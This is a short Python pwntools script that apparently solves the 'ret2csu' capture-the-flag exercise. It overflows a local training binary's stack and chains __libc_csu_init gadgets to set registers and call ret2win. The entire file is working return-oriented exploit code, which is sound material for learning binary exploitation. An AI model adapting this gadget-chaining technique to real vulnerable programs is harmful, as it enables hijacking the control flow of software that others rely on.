#!/usr/bin/python 
from pwn import *

s = process("./ret2csu")
elf = ELF("./ret2csu")

win = elf.symbols["ret2win"]
#pop_r15_ret = 0x4008a2
pops = 0x000000000040089a				# __libc_csu_init + 90 to prepare the registers for setup 
setup = 0x0000000000400880				# __libc_csu_init + 64 to prepare the arguments for ret2win
_fini_ptr = 0x400e48					# pointer to _fini at 0x00000000004008b4
payload = "A"*0x28 
payload += p64(pops)
payload += p64(_fini_ptr/8)
payload += p64(0x801ca)					# to pass the comparison at __libc_csu_init +81 0x0000000000400891
payload += p64(0)						# r12
payload += p64(0x2)						
payload += p64(0x3)
payload += p64(0xdeadcafebabebeef)

payload += p64(setup)				
payload += p64(0)						# At __libc_csu_init + 86 esp is incremented by 8 so we need 1 more value. All of these are fillers for the pop instructions, we just want to reach ret 
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(4)
payload += p64(5)
payload += p64(6)
payload += p64(win)


with open("payload.txt", "w") as f:
	f.write(payload + "\n")

s.sendline(payload)
s.interactive()
